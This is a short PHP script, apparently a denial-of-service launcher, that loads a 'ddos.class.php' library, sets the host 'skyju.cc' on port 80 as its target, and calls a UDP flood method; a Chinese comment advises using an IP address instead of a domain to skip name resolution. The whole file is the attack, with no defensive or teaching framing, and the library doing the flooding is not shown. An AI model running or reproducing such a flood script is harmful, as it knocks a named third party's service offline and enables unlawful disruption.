<?php
require './ddos.class.php';
$ip='skyju.cc';               //这里最好填ip地址，因为域名的话还要解析一次
$port=80;
$ddos = new ddos();
$ddos->setsomething($ip,$port);
$ddos->udp();
?>